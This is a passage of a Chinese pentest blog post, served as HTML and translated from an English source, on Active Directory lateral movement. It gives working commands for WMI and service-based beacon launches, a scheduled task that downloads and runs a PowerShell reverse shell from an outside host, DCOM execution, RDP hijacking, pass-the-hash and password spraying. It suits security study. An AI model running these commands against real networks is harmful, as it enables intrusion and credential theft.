@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="横向移动本文基本上译自参考链接Lateral Movement 寻找拥有访问权限的地方使用以下一种或多种方法，将向Active Directory用户授予对通用资源的访问权限:  使用组策略对象（GPO）将用户添加到本地组 本地添加用户到本地组，可以通过net.exe完成所述功能 模拟一个在多个系统中使用相同密码的本地用户 对共享文件提供读权限 在AD中配置访问控制列表（ACL） 使用AD用户&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="https://blog.z3ratu1.cn/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="横向移动本文基本上译自参考链接Lateral Movement 寻找拥有访问权限的地方使用以下一种或多种方法，将向Active Directory用户授予对通用资源的访问权限:  使用组策略对象（GPO）将用户添加到本地组 本地添加用户到本地组，可以通过net.exe完成所述功能 模拟一个在多个系统中使用相同密码的本地用户 对共享文件提供读权限 在AD中配置访问控制列表（ACL） 使用AD用户&amp;#">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-03-01T08:35:14.000Z">
+<meta property="article:modified_time" content="2021-03-24T12:29:53.096Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="pentest">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>横向移动 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          横向移动
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-01 16:35:14" itemprop="dateCreated datePublished" datetime="2021-03-01T16:35:14+08:00">2021-03-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-24 20:29:53" itemprop="dateModified" datetime="2021-03-24T20:29:53+08:00">2021-03-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html" class="post-meta-item leancloud_visitors" data-flag-title="横向移动" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>本文基本上译自参考链接Lateral Movement</p>
+<h2 id="寻找拥有访问权限的地方"><a href="#寻找拥有访问权限的地方" class="headerlink" title="寻找拥有访问权限的地方"></a>寻找拥有访问权限的地方</h2><p>使用以下一种或多种方法，将向Active Directory用户授予对通用资源的访问权限:</p>
+<ul>
+<li>使用组策略对象（GPO）将用户添加到本地组</li>
+<li>本地添加用户到本地组，可以通过net.exe完成所述功能</li>
+<li>模拟一个在多个系统中使用相同密码的本地用户</li>
+<li>对共享文件提供读权限</li>
+<li>在AD中配置访问控制列表（ACL）</li>
+<li>使用AD用户&#x2F;组配置对MSSQL实例的访问</li>
+</ul>
+<p>关于本地组关系，我们应该对如下几个组最感兴趣</p>
+<ul>
+<li>Administrators</li>
+<li>Remote Desktop Users</li>
+<li>Remote Management Users</li>
+<li>Distributed COM Users</li>
+</ul>
+<h3 id="本地组成员-盲接触"><a href="#本地组成员-盲接触" class="headerlink" title="本地组成员-盲接触"></a>本地组成员-盲接触</h3><p>测试我们是否拥有远程机器的本地管理员权限（位于Administrator组）的最简单方法就是dir一下远程目录<br><code>dir \\&lt;TARGET&gt;\C$</code><br>文件资源管理器直接访问也行<br>或者这个命令<br><code>powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername TARGET</code><br>不过一个个试未免显得有些愚蠢，所以可以使用PowerView(现在已经整合到PowerSploit里面去了)的命令行工具<code>Find-LocalAdminAccess</code>自动化找到当前用户在该域下拥有管理员权限的机器（虽然我已经找不到整合进PowerSploit的哪里面了）</p>
+<p>对于Remote Management Users，可以使用·Invoke-Command·这个工具检查能否在远程机器上执行命令<br><code>Invoke-Command -Computername TARGET -ScriptBlock &#123;whoami&#125;</code><br>Administrator组的用户也可成功执行上述命令<br>对于Remote Desktop Users可以尝试进行一个RDP连接进行尝试<br>对于Remote COM Users可以使用接下来将要讲述的DCOM技术进行验证</p>
+<h3 id="本地组成员-组策略对象"><a href="#本地组成员-组策略对象" class="headerlink" title="本地组成员-组策略对象"></a>本地组成员-组策略对象</h3><p>在默认情况下，任何一个域内用户都可以读取所有的GPO内容，可以通过查看GPO来收集一些信息，且这个操作相较于之前会触发更少的报警和日志<br>可以使用很多工具进行GPO的分析</p>
+<ul>
+<li>PowerView</li>
+<li>BloodHound<br>使用Get-NetGPOGroup工具获得所有配置在本地的GPO<br>使用<code>whoami /groups</code>查看自身所在的组<br>需要注意的是想要枚举远程的本地组需要拥有本地管理员权限<br>使用BloodHound时会将如下节点的关系对应到本地组成员中</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">BloodHound Relationship</th>
+<th align="left">Local Group Membership</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>CanRDP</code></td>
+<td align="left"><code>Remote Desktop Users</code></td>
+</tr>
+<tr>
+<td align="left"><code>AdminTo</code></td>
+<td align="left"><code>Administrators</code></td>
+</tr>
+<tr>
+<td align="left"><code>ExecuteDCOM</code></td>
+<td align="left"><code>Remote COM Users</code></td>
+</tr>
+<tr>
+<td align="left"><code>CanPSRemote</code></td>
+<td align="left"><code>Remote Management Users</code></td>
+</tr>
+</tbody></table>
+<h3 id="访问共享文件"><a href="#访问共享文件" class="headerlink" title="访问共享文件"></a>访问共享文件</h3><p>使用如下命令快速列出目标机器的共享文件（同样还是可以使用文件资源管理器）<br><code>net view TARGET</code><br>使用PowerView的<code>Invoke-ShareFinder</code>可以自动化的列出域内所有共享文件，<code>-CheckAccess</code>flag将会展示当前用户对该文件的读写权限</p>
+<h3 id="访问控制列表-ACL"><a href="#访问控制列表-ACL" class="headerlink" title="访问控制列表(ACL)"></a>访问控制列表(ACL)</h3><p>AD很复杂，因此我们以最直接的方式来解释ACL的概念，AD是一系列对象的数据库，而对象则分为:</p>
+<ul>
+<li>用户</li>
+<li>计算机</li>
+<li>组</li>
+<li>组织单元（OU）</li>
+<li>组策略对象（GPO）<br>ACL则控制访问这些对象的权利，ACL由访问控制项组成（ACE），每一个AD object都有一个ACL确定可以在其上执行的操作</li>
+</ul>
+<p>如果我们可控的一个用户通过配错了的ACL控制某些AD管理员，就能完成横向移动的目的，比如某个管理员账户允许被其他账户改密码（这是有多蠢才能配成这样。。。）</p>
+<h3 id="MSSQL访问"><a href="#MSSQL访问" class="headerlink" title="MSSQL访问"></a>MSSQL访问</h3><p>可以通过配置MSSQL服务使得其通过AD凭证进行用户认证，可以使用<code>PowerUpSQL</code>工具对域内的所有MSSQL服务器进行发现并尝试与其进行接触<br>使用如下命令发现域内所有SQL服务器<br><code>Get-SQLInstanceDomain -Verbose</code><br>或是将上一个命令管道到另一个工具中以测试我们能否访问该访问<br><code>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15</code></p>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Yes</td>
+<td align="left"><code>Administrators</code></td>
+<td align="left">N&#x2F;A</td>
+</tr>
+</tbody></table>
+<p>WMI全称Windows Management Instrumentation，即windows管理规范（？乱翻译的），使用WMI在远程机器上创建进程是完全可行的，且其语法十分简单，如下<br><code>wmic /node:TARGET process call create &quot;notepad.exe&quot;</code><br>当然，只是启动一个进程完全能打穿机器，但是我们可以上传一些比如CobaltStrike生成的SMB信标，并使用WMI执行之</p>
+<pre class=" language-powershell"><code class="language-powershell">shell <span class="token function">copy</span> smb<span class="token operator">-</span>beacon<span class="token punctuation">.</span>exe \\TARGET\C$\windows\temp
+shell wmic <span class="token operator">/</span>node:TARGET <span class="token keyword">process</span> call create “c:\windows\temp\smb<span class="token operator">-</span>beacon<span class="token punctuation">.</span>exe”
+link TARGET`
+</code></pre>
+<p>最后的<code>link TARGET</code>命令是CobaltStrike特有的需求，使用其连接SMB信标打开的命名管道<br>关于SMB信标详见文末参考文章，简要的就是SMB Beacon进行正向连接，目标机器必须开启445端口，使用命名管道执行命令<br>当然这不是让机器上线的唯一方法，你甚至能通过一句话命令不修改硬盘的使机器上线(大概是直接载入内存？但是怎么做呢)</p>
+<h2 id="远程服务创建"><a href="#远程服务创建" class="headerlink" title="远程服务创建"></a>远程服务创建</h2><p>即Remote Service Creation</p>
+<table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Yes</td>
+<td align="left"><code>Administrators</code></td>
+<td align="left">N&#x2F;A</td>
+</tr>
+<tr>
+<td align="left">使用<code>sc.exe</code>可以创建在远端机器上创建一个服务</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<pre class=" language-powershell"><code class="language-powershell"><span class="token function">copy</span> smb<span class="token operator">-</span>beacon<span class="token punctuation">.</span>exe \\TARGET\C$\windows\temp
+<span class="token function">sc</span> \\TARGET create TestService binpath= <span class="token string">"C:\windows\temp\smb-beacon.exe"</span>
+<span class="token function">sc</span> \\TARGET <span class="token function">start</span> TestService
+
+<span class="token comment" spellcheck="true"># from cobalt</span>
+link TARGET
+
+<span class="token comment" spellcheck="true"># clean</span>
+<span class="token function">sc</span> \\TARGET delete TestService
+</code></pre>
+<p>和之前WMI的例子类似，上传一个SMB信标到目标机器，并创建一个服务执行信标，这里需要注意的是这里的信标需要是一个可执行的服务（？）</p>
+<h2 id="远程桌面协议"><a href="#远程桌面协议" class="headerlink" title="远程桌面协议"></a>远程桌面协议</h2><table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">No</td>
+<td align="left"><code>Remote Desktop Users</code></td>
+<td align="left">T1076</td>
+</tr>
+</tbody></table>
+<p>RDP，如果你是一个<code>Remote Desktop Users</code>组中的账户，你也许能适应RDP去登陆到目标系统<br>使用BloodHound的<code>CanRDP</code>可以尝试使用RDP进行登录，查询所有能使用RDP登录其他机器的命令为<br><code>MATCH p=()-[:MemberOf*0..]-&gt;(g:Group)-[r:CanRDP]-&gt;() RETURN p</code></p>
+<h2 id="远程PowerShell"><a href="#远程PowerShell" class="headerlink" title="远程PowerShell"></a>远程PowerShell</h2><table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">No</td>
+<td align="left"><code>Remote Management Users</code>,<code>Administrators</code></td>
+<td align="left">T1028</td>
+</tr>
+<tr>
+<td align="left">使用如下命令可以获取到远程交互式的Powershell</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>Enter-PSSession -Computername TAGRET</code></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">使用<code>Invoke-Command</code>可以以类似的方式执行命令块</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>Invoke-Command -Computername TARGET -ScriptBlock &#123;whoami /priv&#125;</code></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h2 id="任务管理器"><a href="#任务管理器" class="headerlink" title="任务管理器"></a>任务管理器</h2><table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Yes</td>
+<td align="left"><code>Administrators</code></td>
+<td align="left">N&#x2F;A</td>
+</tr>
+</tbody></table>
+<p>如果我们拥有远程系统的本地管理员权限，可以在目标机器上创建一个计划任务（定时任务）<br>使用自带的工具<code>schtasks.exe</code></p>
+<pre class=" language-powershell"><code class="language-powershell">schtasks <span class="token operator">/</span>create <span class="token operator">/</span>S TARGET <span class="token operator">/</span><span class="token function">SC</span> Weekly <span class="token operator">/</span>RU <span class="token string">"NT Authority\SYSTEM"</span> <span class="token operator">/</span>TN <span class="token string">"STCheck"</span> <span class="token operator">/</span>TR <span class="token string">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"</span>
+</code></pre>
+<p>参数如下所示</p>
+<ul>
+<li><code>/S TATGET</code> 指明远端服务器</li>
+<li><code>/SC Weekly</code> 设置任务执行间隔</li>
+<li><code>/RU</code> 指定任务运行权限</li>
+<li><code>/TN</code> 任务名</li>
+<li><code>/TR</code> 任务执行的命令</li>
+</ul>
+<h2 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>PsExec是一个windows命令行工具，其允许管理员在远端机器上运行命令，也是渗透下使用的最多的一种远程命令执行方法（需要用户名和密码登录上去，感觉也就是个ssh）<br>其是Telnet的一个替代工具，如今虽然我们有PowerShell Remoting和Invoke-Command PowerShell工具，但是PsExec仍占据着自己的一席之地<br>其在windowsXP后的系统均受支持（好像不是内置的？）</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Yes</td>
+<td align="left"><code>Administrators</code></td>
+<td align="left">N&#x2F;A</td>
+</tr>
+</tbody></table>
+<p>想要使用PsExec执行命令，首先需要满足如下条件：</p>
+<ul>
+<li><code>File and Printer sharing</code>必须启用(445端口开放)</li>
+<li><code>ADMIN$</code>分享需要可用</li>
+</ul>
+<p>使用如下命令可以用PsExec启用一个交互式的命令提示符<br><code>psexec.exe -accepteula \\TARGET cmd.exe</code></p>
+<h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>Windows Distributed Component Object Model，Windows分布式组件对象模型</p>
+<table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">No</td>
+<td align="left"><code>Remote COM Users</code>,<code>Administrators</code></td>
+<td align="left">T1175</td>
+</tr>
+</tbody></table>
+<p>使用DCOM作为横向移动的技术意味着我们正在通过RPC（remote procedure call）访问DCOM接口，DCOM接口会绑定在远程系统的一个COM对象上，如果我们找到了一个暴露了代码执行函数的DCOM接口，我们也许能使用这些函数进行横向移动<br>幸运的是，许多研究者已经帮我们找到了合适的DCOM对象，MMC app就是一个通过DCOM暴露了意思的函数的windows应用的例子</p>
+<p>如下是一种通过MMC应用在远程机器上执行命令的方法</p>
+<pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$a</span> = <span class="token namespace">[System.Activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application.1"</span><span class="token punctuation">,</span><span class="token string">"TARGET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token variable">$a</span><span class="token punctuation">.</span>Document<span class="token punctuation">.</span>ActiveView<span class="token punctuation">.</span>ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token string">"/c hostname > c:\fromdcom.txt"</span><span class="token punctuation">,</span><span class="token string">"7"</span><span class="token punctuation">)</span>
+</code></pre>
+<p>除了MMC以外，还有很多合适的DCOM对象可以利用，由Cybereason维护了一个很好的收集列表<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology</a></p>
+<p>在默认情况下，只有Administrator组的用户能够远程访问DCOM对象，然而，在某些情况下，<code>Remote COM User</code>组的用户也有使用远程DCOM执行代码的能力</p>
+<p>使用BloodHound可以使用如下命令查看所有可以利用DCOM进行命令执行的机器<br><code>MATCH p=(&#123;owned:true&#125;)-[:MemberOf*0..]-&gt;(g:Group)-[r:ExecuteDCOM|AdminTo]-&gt;() RETURN p</code></p>
+<h2 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h2><p>Password Spray，乱翻译的。。感觉有类似的名词，说白了就是拿一个现成的密码撞</p>
+<table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">No</td>
+<td align="left">N&#x2F;A</td>
+<td align="left">T1110</td>
+</tr>
+</tbody></table>
+<p>可以使用DomainPasswordSpray这个工具自动化碰撞，这里要注意的是允许用户输入错误密码的次数，防止账号被锁定导致碰撞中断</p>
+<h2 id="文件夹重定向和漫游配置文件"><a href="#文件夹重定向和漫游配置文件" class="headerlink" title="文件夹重定向和漫游配置文件"></a>文件夹重定向和漫游配置文件</h2><p>原文是Folder Redirection and Roaming Profiles，后面这半边翻译不出来<br>在虚拟化或VDI环境中，遇上文件夹重定向和漫游配置文件是非常常见的，这项技术使管理员可以为用户的文件夹配置共享位置，我们所要做的是找到所有的重定向文件夹和漫游配置文件，并确认我们是否能写入它们。由于它们可以是常规共享文件，因此我们应该已经在最初的侦查阶段就确认了它们。<br>可以用来进行横向移动的技术有：</p>
+<ul>
+<li>后门EXE</li>
+<li>投放可以触发连向我们以控制机器的SMB连接的特殊文件</li>
+</ul>
+<p>关于上述特殊文件的参考文章<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes">LIVING OFF THE LAND: STEALING NETNTLM HASHES</a></p>
+<h2 id="RDP劫持"><a href="#RDP劫持" class="headerlink" title="RDP劫持"></a>RDP劫持</h2><table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Yes</td>
+<td align="left"><code>Administrators</code></td>
+<td align="left">N&#x2F;A</td>
+</tr>
+</tbody></table>
+<p>当你拥有一个其他人用RDP登录上来的机器的管理员权限时，可以在没有他们的凭证的情况下控制他们的RDP会话<br>使用<code>query user</code>命令查看当前活跃的会话（session）<br>为了获取到他人的会话，我们需要使用如下命令创建一个新的服务</p>
+<pre class=" language-powershell"><code class="language-powershell"><span class="token function">sc</span> create sessionhijack binpath= <span class="token string">"cmd.exe /c tscon 2 /dest:rdp-tcp#7"</span>
+net <span class="token function">start</span> sessionhijack
+</code></pre>
+<p>参数说明：</p>
+<ul>
+<li>tscon的值为需要控制的会话ID</li>
+<li>&#x2F;dest值为当前我们自己会话的名字</li>
+</ul>
+<p>（不过他人远程登录到我这上面来了，是不是能直接mimikatz把凭证dump出来）</p>
+<h2 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass-the-Hash"></a>Pass-the-Hash</h2><p>哈希传递</p>
+<table>
+<thead>
+<tr>
+<th align="left">Requires Admin</th>
+<th align="left">Local Group Membership</th>
+<th align="left">ATTACK ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Yes</td>
+<td align="left"><code>Administrators</code></td>
+<td align="left">T1075</td>
+</tr>
+</tbody></table>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>经典mimikatz<br><code>sekurlsa::pth /user:.\localadmin /ntlm:HASH /run:cmd.exe</code>获得一个对应用户的cmd</p>
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><h3 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h3><p>可以通过PtH来远程桌面登录到一个系统上<br>但只在目标型号的操作系统上生效：</p>
+<ul>
+<li>Windows Server 2012 R2</li>
+<li>Windows 8.1<br>使用xfreerdp工具完成攻击<br><code>xfreerdp /u:admin /d:. /pth:hash:hash /v:TARGET</code></li>
+</ul>
+<h3 id="用户账户控制-amp-用户权限分配"><a href="#用户账户控制-amp-用户权限分配" class="headerlink" title="用户账户控制&amp;用户权限分配"></a>用户账户控制&amp;用户权限分配</h3><p>User Account Control &amp; User Right Assignment<br>UAC中的某些设置可能导致PtH攻击无法生效，见下表</p>
+<table>
+<thead>
+<tr>
+<th align="left">EnableLUA</th>
+<th align="left">LocalAccountTokenFilterPolicy</th>
+<th align="left">FilterAdministratorToken</th>
+<th align="left">Effect</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0</td>
